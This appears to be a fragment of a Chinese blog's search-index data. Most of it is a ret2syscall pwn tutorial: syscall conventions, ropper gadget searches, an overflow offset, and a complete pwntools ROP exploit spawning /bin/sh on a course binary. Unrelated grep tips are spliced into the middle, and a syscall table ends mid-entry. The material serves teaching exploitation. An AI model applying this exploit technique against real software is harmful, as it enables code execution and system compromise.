的完全兼容。\n\n\n","tags":["编码"]},{"title":"凯撒密码解析","url":"/2025/06/03/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81%E8%A7%A3%E6%9E%90/","content":"加密方法把明文中所有字母都在字母表上向后或者向前按照一个固定数目进行偏移后被替换成密文\n\n\n\n代码实现\n","tags":["凯撒密码"]},{"title":"pwn-ret2syscall","url":"/2025/06/06/pwn-ret2syscall/","content":"pwn-ret2syscallsyscall简介syscall 就是连接用户态和内核态的桥梁 Linux系统中 用户空间通过向内核空间发出syscall 产生软中断从而让程序陷入内核态 执行相应的操作 而对于每个系统调用都会有一个对应的系统调用号 系统调用提供用户程序与操作系统间的接口 部分库函数(scanf、puts)等IO相关的函数实际上是对系统调用的封装(read和write)\n/usr/include/x86_64-linux-gnu/asm/unistd_64.h\n/usr/include/x86_64-linux-gnu/asm/unistd_32.h\n\n\n\n文本过滤✅ 一、查找包含特定内容的行cat file.txt | grep &quot;关键词&quot;\n\n示例：\ncat log.txt | grep &quot;error&quot;\n\n\n查找 log.txt 中包含 “error” 的所有行。\n\n\n✅ 二、查找不包含关键词的行cat file.txt | grep -v &quot;关键词&quot;\n\n\n✅ 三、忽略大小写查找cat file.txt | grep -i &quot;关键词&quot;\n\n\n✅ 四、查找多关键词（正则或多个grep）cat file.txt | grep -E &quot;error|warning&quot;\n\n或者：\ncat file.txt | grep &quot;error&quot; | grep &quot;timeout&quot;\n\n\n✅ 五、仅输出匹配内容（不含整行）cat file.txt | grep -o &quot;关键词&quot;\n\n\n✅ 六、查找上下文内容（上下几行）cat file.txt | grep -A 2 -B 2 &quot;关键词&quot;\n\n\n-A 2：后2行\n-B 2：前2行\n-C 2：前后各2行\n\n\n✅ 七、配合 awk 精准控制输出字段例如查找包含关键词并输出第2列：\ncat file.txt | awk &#x27;/关键词/ &#123;print $2&#125;&#x27;\nLinux Syscall64 Reference\n其中32位系统调用由 int 0x80 触发\n其中64位系统调用由 syscall 触发\n(表格在最后)\n系统调用的传参过程系统调用与普通的函数调用不同 他的所有参数都是通过寄存器传递的(前几个参数) 这一点在32位上尤其需要区分\n例如\n\nexecve 函数实际调用的就是sys_execve \n是一个系统调用\n32位下他的寄存器传参情况如上\n将寄存器调整为\neax:0xb ebx:/bin/sh ecx:0 edx:0\n之后调用 int 0x80 即可\n可以使用 man 命令 进行查看参数\n在32位系统调用中 传入参数的顺序是\nebx,ecx,edx,esi,edi\n其中eax存放系统调用号\n在64位系统调用中 传入参数的顺序是\nrdi,rsi,rdx,r10,r8,r9\n其中rax存放系统调用号\n例题ret2syscall\n先查保护\n另外说一嘴 \nfile ret2syscall ret2syscall: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=bf4950f72d65ea308335af9bb7d8b77dff2bda41, not stripped\n用file可以查出该软件是否是静态编译 statically  即使静态编译\n(Pwn-py312) (base) cccccchow@Chow:~/pwn/AAA/山化课程/day03-ret2syscall$ checksec ret2syscall[*] &#x27;/home/cccccchow/pwn/AAA/山化课程/day03-ret2syscall/ret2syscall&#x27;    Arch:       amd64-64-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x400000)    Stripped:   No\n\n发现开启了NX保护 也就是说栈不可执行 然后再IDA里面也没有看到 system 以及 execve 等函数\n先说下exp的写法和原理\n假设：\n\npop_rax = p64(0x4bc808) 是一个地址，里面的代码是 pop rax; ret;\npop_rdi = p64(0x401626) 是 pop rdi; ret;\npop_rsi = p64(0x401747) 是 pop rsi; ret;\npop_rdx = p64(0x442b66) 是 pop rdx; ret;\nsyscall = p64(0x467685) 是 syscall; ret;\nbs = p64(0x004a1384) 是字符串 “&#x2F;bin&#x2F;sh” 在内存中的地址\n\n\nexp执行过程详解\n执行 pop rax; ret：\n\n\nCPU跳到 pop_rax 地址\n执行 pop rax，把栈顶的下一个8字节（0x3b）弹出放入 rax 寄存器\n接着执行 ret，跳转到栈上接下来的地址，也就是 pop_rdi 的地址\n\n\n\n执行 pop rdi; ret：\n\n\n弹出栈顶8字节，放到 rdi 寄存器（这个值是 bs，”&#x2F;bin&#x2F;sh” 字符串地址）\nret 跳转到下一个 pop_rsi 的地址\n\n\n\n执行 pop rsi; ret：\n\n\n弹出0，放入 rsi\nret 跳转到 pop_rdx\n\n\n\n执行 pop rdx; ret：\n\n\n弹出0，放入 rdx\nret 跳转到 syscall\n\n\n\n执行 syscall; ret：\n\n\n发起系统调用 execve(&quot;/bin/sh&quot;, NULL, NULL)，系统内核会帮你执行 /bin/sh shell\n如果成功，shell就被打开了！\n\n\n栈内的数据顺序示意图（8字节为单位）\n假设溢出后栈顶（rsp）指向：\n\n\n\n栈地址（从上到下，rsp向下增长）\n内容\n说明\n\n\n\nrsp + 0\npop_rax\n跳转到这个地址执行 pop rax\n\n\nrsp + 8\n0x3b\npop rax后，rax&#x3D;0x3b\n\n\nrsp + 16\npop_rdi\npop rdi; ret的地址\n\n\nrsp + 24\nbs (“&#x2F;bin&#x2F;sh”地址)\npop rdi后，rdi&#x3D;bs\n\n\nrsp + 32\npop_rsi\npop rsi; ret的地址\n\n\nrsp + 40\n0\npop rsi后，rsi&#x3D;0\n\n\nrsp + 48\npop_rdx\npop rdx; ret的地址\n\n\nrsp + 56\n0\npop rdx后，rdx&#x3D;0\n\n\nrsp + 64\nsyscall\nsyscall; ret的地址\n\n\n每执行完一个 pop gadget，rsp 上移16字节（8字节pop值 + 8字节ret地址），执行下一条ret跳转下一个gadget。\n栈顶 (rsp 指向这里，向下地址递增)\n+——————+ &lt;— rsp (程序开始执行ROP链时)|   pop_rax        |  # 地址，执行 pop rax; ret;+——————+|     0x3b         |  # 被 pop 到 rax+——————+|   pop_rdi        |  # 地址，执行 pop rdi; ret;+——————+|      bs          |  # “&#x2F;bin&#x2F;sh” 地址，被 pop 到 rdi+——————+|   pop_rsi        |  # 地址，执行 pop rsi; ret;+——————+|       0          |  # 被 pop 到 rsi+——————+|   pop_rdx        |  # 地址，执行 pop rdx; ret;+——————+|       0          |  # 被 pop 到 rdx+——————+|   syscall        |  # 地址，执行 syscall; ret;+——————+|   …            |  # 后面可能还有其他内容\n假设当前栈顶指针是 rsp，执行 pop reg 后，做了以下三件事：\n\n从栈顶把数据取出来放到寄存器 reg也就是说，把 [rsp] 地址上的内容读出来，赋值给 reg。举例：pop rax 就是把 [rsp] 里的8字节读进 rax。\n移动栈指针 rsp 向上（加8字节，64位系统）把栈顶指针 rsp 增加8（64位下，每个栈项是8字节），这样栈顶就往栈高地址方向移动，指向下一个栈元素。\n执行下一条指令（通常是 ret）在ROP链中，pop 一般配合 ret 使用，ret 从栈顶取出地址跳转。\n\n所以我们就要去构造系统调用了 先搜索一遍\n(ret2syscall/ELF/x86_64)&gt; search syscall[INFO] Searching for gadgets: syscall[INFO] File: ret2syscall0x00000000004003da: syscall; 0x000000000046a96e: syscall; add rsp, 0x98; xor eax, eax; pop rbx; pop rbp; ret; 0x000000000043f885: syscall; cmp rax, -0x1000; ja 0x3f8d0; add rsp, 0x60; pop rbx; ret; 0x000000000046ac85: syscall; cmp rax, -0x1000; ja 0x6ac98; pop rbx; ret; 0x000000000043f5a5: syscall; cmp rax, -0xfff; jae 0x44810; ret; 0x000000000047e352: syscall; jmp 0x7e2a5; nop dword ptr [rax]; call rax; 0x0000000000442b87: syscall; pop rdx; pop rsi; ret; 0x000000000047cbed: syscall; test edx, edx; jne 0x7cbcf; mov dword ptr fs:[0x2d0], eax; ret; 0x0000000000467685: syscall; ret; (ret2syscall/ELF/x86_64)&gt; search pop rax[INFO] Searching for gadgets: pop rax[INFO] File: ret2syscall0x00000000004c3ecd: pop rax; add byte ptr [rax], al; nop; ret; 0x000000000044faba: pop rax; add rax, 0x200; mov qword ptr fs:[rdx], rax; ret; 0x00000000004c4c18: pop rax; in eax, 0xf9; jmp rax; 0x0000000000418b12: pop rax; mov dword ptr [rdi + 4], eax; ret; 0x000000000049bd15: pop rax; mov eax, dword ptr [rbx + 8]; movsxd rax, dword ptr [r14 + rax*4]; add rax, r14; jmp rax; 0x0000000000478856: pop rax; pop rdx; pop rbx; ret; 0x00000000004bc790: pop rax; ret 0x4b; 0x0000000000409b44: pop rax; ret 0xffff; 0x00000000004c0858: pop rax; cmc; jmp qword ptr [rdi + 1]; 0x00000000004bc808: pop rax; ret; (ret2syscall/ELF/x86_64)&gt; search pop rdi[INFO] Searching for gadgets: pop rdi[INFO] File: ret2syscall0x00000000004c45e5: pop rdi; add byte ptr [rax], al; test al, 9; stc; call qword ptr [rsi + 0x2b]; 0x000000000042c1ad: pop rdi; add eax, dword ptr [rax]; add byte ptr [rax - 0x7d], cl; ret 0x4910; 0x00000000004886cd: pop rdi; and al, 0; jae 0x886df; mov rdx, qword ptr [rip + 0x24445e]; add word ptr [rdx + rax*2], 1; ret; 0x0000000000431f29: pop rdi; in al, dx; mov qword ptr [rdi - 0xc], rcx; mov dword ptr [rdi - 4], edx; ret; 0x0000000000431d39: pop rdi; in eax, dx; mov qword ptr [rdi - 0xb], rcx; mov dword ptr [rdi - 4], edx; ret; 0x00000000004ba99e: pop rdi; insd dword ptr [rdi], dx; test eax, 0x7d4c8c5d; ret 0xd8f; 0x00000000004320fa: pop rdi; jmp 0x32145; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; 0x0000000000432142: pop rdi; jmp 0x3218d; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; 0x0000000000432180: pop rdi; jmp 0x321cb; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; 0x00000000004321bc: pop rdi; jmp 0x32207; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; 0x00000000004321f6: pop rdi; jmp 0x32241; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; 0x000000000043222e: pop rdi; jmp 0x32279; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; 0x0000000000432256: pop rdi; jmp 0x322a1; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; 0x000000000043227e: pop rdi; jmp 0x322c9; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; 0x00000000004324fa: pop rdi; jmp 0xfffffffff152ae48; mov qword ptr [rdi - 8], rdx; ret; 0x0000000000432542: pop rdi; jmp 0xfffffffff152ae90; mov qword ptr [rdi - 8], rdx; ret; 0x0000000000432580: pop rdi; jmp 0xfffffffff152aece; mov qword ptr [rdi - 8], rdx; ret; 0x00000000004325b8: pop rdi; jmp 0xfffffffff152af06; mov qword ptr [rdi - 8], rdx; ret; 0x00000000004325f6: pop rdi; jmp 0xfffffffff152af44; mov qword ptr [rdi - 8], rdx; ret; 0x000000000043262e: pop rdi; jmp 0xfffffffff152af7c; mov qword ptr [rdi - 8], rdx; ret; 0x0000000000432656: pop rdi; jmp 0xfffffffff152afa4; mov qword ptr [rdi - 8], rdx; ret; 0x000000000043267e: pop rdi; jmp 0xfffffffff152afcc; mov qword ptr [rdi - 8], rdx; ret; 0x0000000000441ab2: pop rdi; jmp rax; 0x000000000043b50d: pop rdi; mov al, byte ptr [rsi]; add byte ptr [rcx + 0x63], cl; or al, 0x93; lea rcx, [r11 + rcx]; jmp rcx; 0x00000000004b9961: pop rdi; mov dh, 0x4e; ret 0x474c; 0x000000000049e57e: pop rdi; mov rax, rbx; pop rbx; pop rbp; pop r12; ret; 0x0000000000431b59: pop rdi; out dx, al; mov qword ptr [rdi - 0xa], rcx; mov dword ptr [rdi - 4], edx; ret; 0x0000000000431989: pop rdi; out dx, eax; mov qword ptr [rdi - 9], r8; mov dword ptr [rdi - 4], edx; ret; 0x0000000000431a85: pop rdi; out dx, eax; mov qword ptr [rdi - 9], rcx; mov byte ptr [rdi - 1], dl; ret; 0x00000000004319d1: pop rdi; out dx, eax; mov qword ptr [rdi - 9], rcx; mov dword ptr [rdi - 4], edx; ret; 0x000000000040224a: pop rdi; pop rbp; ret; 0x00000000004c05a1: pop rdi; cmc; jmp qword ptr [rsi + 2]; 0x0000000000401626: pop rdi; ret; (ret2syscall/ELF/x86_64)&gt; search pop rsi[INFO] Searching for gadgets: pop rsi[INFO] File: ret2syscall0x000000000042c0ae: pop rsi; add al, 0; add byte ptr [rax - 0x7d], cl; ret 0xe910; 0x000000000044b242: pop rsi; add al, bpl; xchg byte ptr [rsi - 5], ah; jmp qword ptr [rsi + 0xf]; 0x0000000000473e13: pop rsi; add dword ptr [rax], eax; add byte ptr [rax + 0x39], cl; ret 0xf48; 0x000000000042642c: pop rsi; add dword ptr [rax], eax; ret; 0x000000000047377c: pop rsi; add r8b, bpl; loope 0x7377b; jmp qword ptr [rsi + 0x2e]; 0x00000000004886d6: pop rsi; and al, 0; add word ptr [rdx + rax*2], 1; ret; 0x0000000000426ed2: pop rsi; and byte ptr [rbx + rcx*4 + 0x66], cl; sub byte ptr [rbx + rcx*4 + 0x6e], cl; xor byte ptr [rbx + rcx*4 + 0x76], cl; cmp byte ptr [rax + 0xf], cl; ret; 0x000000000048f191: pop rsi; fmul st(0); ret; 0x000000000048f10f: pop rsi; fmulp st(1); ret; 0x000000000042cbb5: pop rsi; or byte ptr [rax - 0x7d], cl; ret 0x4801; 0x0000000000441ab0: pop rsi; pop r15; jmp rax; 0x0000000000402248: pop rsi; pop r15; pop rbp; ret; 0x0000000000401624: pop rsi; pop r15; ret; 0x00000000004b96dc: pop rsi; sar byte ptr [rip + 0x733db8a1], 0xd7; jo 0xb9757; mov ebp, 0xfb67d10d; ret; 0x0000000000401747: pop rsi; ret; (ret2syscall/ELF/x86_64)&gt; search pop rdx[INFO] Searching for gadgets: pop rdx[INFO] File: ret2syscall0x0000000000426099: pop rdx; add byte ptr [rax + 0x43da10], dil; cmove rax, rdx; ret; 0x00000000004c40dd: pop rdx; add byte ptr [rax], al; jo 0xc409b; clc; call qword ptr [rcx]; 0x00000000004c40f5: pop rdx; add byte ptr [rax], al; js 0xc40b3; clc; call qword ptr [rsi]; 0x00000000004269cb: pop rdx; add r11b, sil; ret; 0x0000000000461e20: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x1088], 1; mov rax, qword ptr [rax*8 + 0x4b3ba0]; jmp rax; 0x0000000000460618: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x1090], 1; mov rax, qword ptr [rax*8 + 0x4b39a0]; jmp rax; 0x0000000000461b85: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x10a0], 1; mov rax, qword ptr [rax*8 + 0x4b3ea0]; jmp rax; 0x0000000000461d38: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x10a8], 1; mov rax, qword ptr [rax*8 + 0x4b3ea0]; jmp rax; 0x0000000000461cfa: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x10b0], 1; mov rax, qword ptr [rax*8 + 0x4b3ea0]; jmp rax; 0x00000000004606ae: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x10b8], 1; mov rax, qword ptr [rax*8 + 0x4b3ea0]; jmp rax; 0x00000000004606ec: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x10c8], 1; mov rax, qword ptr [rax*8 + 0x4b3ea0]; jmp rax; 0x00000000004ba581: pop rdx; je 0xba548; ret 0xacfc; 0x00000000004b93a4: pop rdx; jp 0xb9400; cmp byte ptr [rbx + rdi*2], bh; push -0x42; outsb dx, byte ptr [rsi]; call qword ptr [rcx - 0x66]; 0x000000000047e4ee: pop rdx; or byte ptr [rcx + 3], cl; sbb al, byte ptr [rbx + 0xa3c0fe0]; jne 0x7e4ad; nop word ptr [rax + rax]; call rbx; 0x00000000004bb547: pop rdx; out 0xf5, eax; mov ch, 0xab; ret; 0x0000000000442b64: pop rdx; pop r10; ret; 0x0000000000478857: pop rdx; pop rbx; ret; 0x0000000000442b89: pop rdx; pop rsi; ret; 0x000000000048f072: pop rdx; sub bh, dh; jmp qword ptr [rsi + 0x2e]; 0x00000000004a3669: pop rdx; clc; jmp qword ptr [rax]; 0x0000000000442b66: pop rdx; ret; (ret2syscall/ELF/x86_64)&gt; search pop r10[INFO] Searching for gadgets: pop r10[INFO] File: ret2syscall0x0000000000442b65: pop r10; ret; (ret2syscall/ELF/x86_64)&gt; search pop r8[INFO] Searching for gadgets: pop r8[INFO] File: ret2syscall0x0000000000418b11: pop r8; mov dword ptr [rdi + 4], eax; ret; (ret2syscall/ELF/x86_64)&gt; search pop r9[INFO] Searching for gadgets: pop r9\n\n搜完之后我们就去找溢出点了 如下所示\n →   0x400a09 &lt;main+005b&gt;      ret    [!] Cannot disassemble from $PC─────────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;ret2syscall&quot;, stopped 0x400a09 in main (), reason: SINGLE STEP───────────────────────────────────────────────────────────────────────── trace ────[#0] 0x400a09 → main()────────────────────────────────────────────────────────────────────────────────────gef➤  cyclic -l paaaaaaaFinding cyclic pattern of 8 bytes: b&#x27;paaaaaaa&#x27; (hex: 0x7061616161616161)Found at offset 120\n\n泄漏点是 120\n然后我们接着通过 ropper 搜索 /bin/sh 如下所示\n(ret2syscall/ELF/x86_64)&gt; string /bin/shStrings=======Address     Value    -------     -----    0x004a1384  /bin/sh(ret2syscall/ELF/x86_64)&gt; \n\n还得搜索一个syscall\n(ret2syscall/ELF/x86_64)&gt; search syscall[INFO] Searching for gadgets: syscall[INFO] File: ret2syscall0x00000000004003da: syscall; 0x000000000046a96e: syscall; add rsp, 0x98; xor eax, eax; pop rbx; pop rbp; ret; 0x000000000043f885: syscall; cmp rax, -0x1000; ja 0x3f8d0; add rsp, 0x60; pop rbx; ret; 0x000000000046ac85: syscall; cmp rax, -0x1000; ja 0x6ac98; pop rbx; ret; 0x000000000043f5a5: syscall; cmp rax, -0xfff; jae 0x44810; ret; 0x000000000047e352: syscall; jmp 0x7e2a5; nop dword ptr [rax]; call rax; 0x0000000000442b87: syscall; pop rdx; pop rsi; ret; 0x000000000047cbed: syscall; test edx, edx; jne 0x7cbcf; mov dword ptr fs:[0x2d0], eax; ret; 0x0000000000467685: syscall; ret; (ret2syscall/ELF/x86_64)&gt; \n\nexp 如下：\nfrom pwn import*p = process(&quot;ret2syscall&quot;)context.arch = &#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;gdb.attach(p,&quot;b main\\nc&quot;)pop_rax = p64(0x4bc808)pop_rdi = p64(0x401626)pop_rsi = p64(0x401747)pop_rdx = p64(0x442b66)syscall = p64(0x467685)# /bin/shbs = p64(0x004a1384)payload = b&#x27;a&#x27;*120# 让 正常函数的ret返回到 pop_rax 处payload +=pop_rax + p64(0x3b)payload +=pop_rdi + bspayload +=pop_rsi + p64(0)payload +=pop_rdx + p64(0)payload += syscallp.sendline(payload)p.interactive()\n\n\n\n1. \n附件：x86_32 Syscall table\n\n\nNum\nsyscall\n%eax\narg0 (%ebx)\narg1 (%ecx)\narg2 (%edx)\narg3 (%esi)\narg4 (%edi)\narg5 (%ebp)\n\n\n\n0\nrestart_syscall\n0x00\n-\n-\n-\n-\n-\n-\n\n\n1\nexit\n0x01\nint error_code\n-\n-\n-\n-\n-\n\n\n2\nfork\n0x02\n-\n-\n-\n-\n-\n-\n\n\n3\nread\n0x03\nunsigned int fd\nchar *buf\nsize_t count\n-\n-\n-\n\n\n4\nwrite\n0x04\nunsigned int fd\nconst char *buf\nsize_t count\n-\n-\n-\n\n\n5\nopen\n0x05\nconst char *filename\nint flags\numode_t mode\n-\n-\n-\n\n\n6\nclose\n0x06\nunsigned int fd\n-\n-\n-\n-\n-\n\n\n7\nwaitpid\n0x07\npid_t pid\nint *stat_addr\nint options\n-\n-\n-\n\n\n8\ncreat\n0x08\nconst char *pathname\numode_t mode\n-\n-\n-\n-\n\n\n9\nlink\n0x09\nconst char *oldname\nconst char *newname\n-\n-\n-\n-\n\n\n10\nunlink\n0x0a\nconst char *pathname\n-\n-\n-\n-\n-\n\n\n11\nexecve\n0x0b\nconst char *filename\nconst char *const *argv\nconst char *const *envp\n-\n-\n-\n\n\n12\nchdir\n0x0c\nconst char *filename\n-\n-\n-\n-\n-\n\n\n13\ntime\n0x0d\ntime_t *tloc\n-\n-\n-\n-\n-\n\n\n14\nmknod\n0x0e\nconst char *filename\numode_t mode\nunsigned dev\n-\n-\n-\n\n\n15\nchmod\n0x0f\nconst char *filename\numode_t mode\n-\n-\n-\n-\n\n\n16\nlchown\n0x10\nconst char *filename\nuid_t user\ngid_t group\n-\n-\n-\n\n\n17\nbreak\n0x11\n?\n?\n?\n?\n?\n?\n\n\n18\noldstat\n0x12\n?\n?\n?\n?\n?\n?\n\n\n19\nlseek\n0x13\nunsigned int fd\noff_t offset\nunsigned int whence\n-\n-\n-\n\n\n20\ngetpid\n0x14\n-\n-\n-\n-\n-\n-\n\n\n21\nmount\n0x15\nchar *dev_name\nchar *dir_name\nchar *type\nunsigned long flags\nvoid *data\n-\n\n\n22\numount\n0x16\nchar *name\nint flags\n-\n-\n-\n-\n\n\n23\nsetuid\n0x17\nuid_t uid\n-\n-\n-\n-\n-\n\n\n24\ngetuid\n0x18\n-\n-\n-\n-\n-\n-\n\n\n25\nstime\n0x19\ntime_t *tptr\n-\n-\n-\n-\n-\n\n\n26\nptrace\n0x1a\nlong request\nlong pid\nunsigned long addr\nunsigned long data\n-\n-\n\n\n27\nalarm\n0x1b\nunsigned int seconds\n-\n-\n-\n-\n-\n\n\n28\noldfstat\n0x1c\n?\n?\n?\n?\n?\n?\n\n\n29\npause\n0x1d\n-\n-\n-\n-\n-\n-\n\n\n30\nutime\n0x1e\nchar *filename\nstruct utimbuf *times\n-\n-\n-\n-\n\n\n31\nstty\n0x1f\n?\n?\n?\n?\n?\n?\n\n\n32\ngtty\n0x20\n?\n?\n?\n?\n?\n?\n\n\n33\naccess\n0x21\nconst char *filename\nint mode\n-\n-\n-\n-\n\n\n34\nnice\n0x22\nint increment\n-\n-\n-\n-\n-\n\n\n35\nftime\n0x23\n?\n?\n?\n?\n?\n?\n\n\n36\nsync\n0x24\n-\n-\n-\n-\n-\n-\n\n\n37\nkill\n0x25\npid_t pid\nint sig\n-\n-\n-\n-\n\n\n38\nrename\n0x26\nconst char *oldname\nconst char *newname\n-\n-\n-\n-\n\n\n39\nmkdir\n0x27\nconst char *pathname\numode_t mode\n-\n-\n-\n-\n\n\n40\nrmdir\n0x28\nconst char *pathname\n-\n-\n-\n-\n-\n\n\n41\ndup\n0x29\nunsigned int fildes\n-\n-\n-\n-\n-\n\n\n42\npipe\n0x2a\nint *fildes\n-\n-\n-\n-\n-\n\n\n43\ntimes\n0x2b\nstruct tms *tbuf\n-\n-\n-\n-\n-\n\n\n44\nprof\n0x2c\n?\n?\n?\n?\n?\n?\n\n\n45\nbrk\n0x2d\nunsigned long brk\n-\n-\n-\n-\n-\n\n\n46\nsetgid\n0x2e\ngid_t gid\n-\n-\n-\n-\n-\n\n\n47\ngetgid\n0x2f\n-\n-\n-\n-\n-\n-\n\n\n48\nsignal\n0x30\nint sig\n__sighandler_t handler\n-\n-\n-\n-\n\n\n49\ngeteuid\n0x31\n-\n-\n-\n-\n-\n-\n\n\n50\ngetegid\n0x32\n-\n-\n-\n-\n-\n-\n\n\n51\nacct\n0x33\nconst char *name\n-\n-\n-\n-\n-\n\n\n52\numount2\n0x34\n?\n?\n?\n?\n?\n?\n\n\n53\nlock\n0x35\n?\n?\n?\n?\n?\n?\n\n\n54\nioctl\n0x36\nunsigned int fd\nunsigned int cmd\nunsigned long arg\n-\n-\n-\n\n\n55\nfcntl\n0x37\nunsigned int fd\nunsigned int cmd\nunsigned long arg\n-\n-\n-\n\n\n56\nmpx\n0x38\n?\n?\n?\n?\n?\n?\n\n\n57\nsetpgid\n0x39\npid_t pid\npid_t pgid\n-\n-\n-\n-\n\n\n58\nulimit\n0x3a\n?\n?\n?\n?\n?\n?\n\n\n59\noldolduname\n0x3b\n?\n?\n?\n?\n?\n?\n\n\n60\numask\n0x3c\nint mask\n-\n-\n-\n-\n-\n\n\n61\nchroot\n0x3d\nconst char *filename\n-\n-\n-\n-\n-\n\n\n62\nustat\n0x3e\nunsigned dev\nstruct ustat *ubuf\n-\n-\n-\n-\n\n\n63\ndup2\n0x3f\nunsigned int oldfd\nunsigned int newfd\n-\n-\n-\n-\n\n\n64\ngetppid\n0x40\n-\n-\n-\n-\n-\n-\n\n\n65\ngetpgrp\n0x41\n-\n-\n-\n-\n-\n-\n\n\n66\nsetsid\n0x42\n-\n-\n-\n-\n-\n-\n\n\n67\nsigaction\n0x43\nint\nconst struct old_sigaction *\nstruct old_sigaction *\n-\n-\n-\n\n\n68\nsgetmask\n0x44\n-\n-\n-\n-\n-\n-\n\n\n69\nssetmask\n0x45\nint newmask\n-\n-\n-\n-\n-\n\n\n70\nsetreuid\n0x46\nuid_t ruid\nuid_t euid\n-\n-\n-\n-\n\n\n71\nsetregid\n0x47\ngid_t rgid\ngid_t egid\n-\n-\n-\n-\n\n\n72\nsigsuspend\n0x48\nint unused1\nint unused2\nold_sigset_t mask\n-\n-\n-\n\n\n73\nsigpending\n0x49\nold_sigset_t *uset\n-\n-\n-\n-\n-\n\n\n74\nsethostname\n0x4a\nchar *name\nint len\n-\n-\n-\n-\n\n\n75\nsetrlimit\n0x4b\nunsigned int resource\nstruct rlimit *rlim\n-\n-\n-\n-\n\n\n76\ngetrlimit\n0x4c\nunsigned int resource\nstruct rlimit *rlim\n-\n-\n-\n-\n\n\n77\ngetrusage\n0x4d\nint who\nstruct rusage *ru\n-\n-\n-\n-\n\n\n78\ngettimeofday\n0x4e\nstruct timeval *tv\nstruct timezone *tz\n-\n-\n-\n-\n\n\n79\nsettimeofday\n0x4f\nstruct timeval *tv\nstruct timezone *tz\n-\n-\n-\n-\n\n\n80\ngetgroups\n0x50\nint gidsetsize\ngid_t *grouplist\n-\n-\n-\n-\n\n\n81\nsetgroups\n0x51\nint gidsetsize\ngid_t *grouplist\n-\n-\n-\n-\n\n\n82\nselect\n0x52\nint n\nfd_set *inp\nfd_set *outp\nfd_set *exp\nstruct timeval *tvp\n-\n\n\n83\nsymlink\n0x53\nconst char *old\nconst char *new\n-\n-\n-\n-\n\n\n84\noldlstat\n0x54\n?\n?\n?\n?\n?\n?\n\n\n85\nreadlink\n0x55\nconst char *path\nchar *buf\nint bufsiz\n-\n-\n-\n\n\n86\nuselib\n0x56\nconst char *library\n-\n-\n-\n-\n-\n\n\n87\nswapon\n0x57\nconst char *specialfile\nint swap_flags\n-\n-\n-\n-\n\n\n88\nreboot\n0x58\nint magic1\nint magic2\nunsigned int cmd\nvoid *arg\n-\n-\n\n\n89\nreaddir\n0x59\n?\n?\n?\n?\n?\n?\n\n\n90\nmmap\n0x5a\n?\n?\n?\n?\n?\n?\n\n\n91\nmunmap\n0x5b\nunsigned long addr\nsize_t len\n-\n-\n-\n-\n\n\n92\ntruncate\n0x5c\nconst char *path\nlong length\n-\n-\n-\n-\n\n\n93\nftruncate\n0x5d\nunsigned int fd\nunsigned long length\n-\n-\n-\n-\n\n\n94\nfchmod\n0x5e\nunsigned int fd\numode_t mode\n-\n-\n-\n-\n\n\n95\nfchown\n0x5f\nunsigned int fd\nuid_t user\ngid_t group\n-\n-\n-\n\n\n96\ngetpriority\n0x60\nint which\nint who\n-\n-\n-\n-\n\n\n97\nsetpriority\n0x61\nint which\nint who\nint niceval\n-\n-\n-\n\n\n98\nprofil\n0x62\n?\n?\n?\n?\n?\n?\n\n\n99\nstatfs\n0x63\nconst char * path\nstruct statfs *buf\n-\n-\n-\n-\n\n\n100\nfstatfs\n0x64\nunsigned int fd\nstruct statfs *buf\n-\n-\n-\n-\n\n\n101\nioperm\n0x65\nunsigned long from\nunsigned long num\nint on\n-\n-\n-\n\n\n102\nsocketcall\n0x66\nint call\nunsigned long *args\n-\n-\n-\n-\n\n\n103\nsyslog\n0x67\nint type\nchar *buf\nint len\n-\n-\n-\n\n\n104\nsetitimer\n0x68\nint which\nstruct itimerval *value\nstruct itimerval *ovalue\n-\n-\n-\n\n\n105\ngetitimer\n0x69\nint which\nstruct itimerval *value\n-\n-\n-\n-\n\n\n106\nstat\n0x6a\nconst char *filename\nstruct __old_kernel_stat *statbuf\n-\n-\n-\n-\n\n\n107\nlstat\n0x6b\nconst char *filename\nstruct __old_kernel_stat *statbuf\n-\n-\n-\n-\n\n\n108\nfstat\n0x6c\nunsigned int fd\nstruct __old_kernel_stat *statbuf\n-\n-\n-\n-\n\n\n109\nolduname\n0x6d\nstruct oldold_utsname *\n-\n-\n-\n-\n-\n\n\n110\niopl\n0x6e\n?\n?\n?\n?\n?\n?\n\n\n111\nvhangup\n0x6f\n-\n-\n-\n-\n-\n-\n\n\n112\nidle\n0x70\n?\n?\n?\n?\n?\n?\n\n\n113\nvm86old\n0x71\n?\n?\n?\n?\n?\n?\n\n\n114\nwait4\n0x72\npid_t pid\nint *stat_addr\nint options\nstruct rusage *ru\n-\n-\n\n\n115\nswapoff\n0x73\nconst char *specialfile\n-\n-\n-\n-\n-\n\n\n116\nsysinfo\n0x74\nstruct sysinfo *info\n-\n-\n-\n-\n-\n\n\n117\nipc\n0x75\nunsigned int call\nint first\nunsigned long second\nunsigned long third\nvoid *ptr\nlong 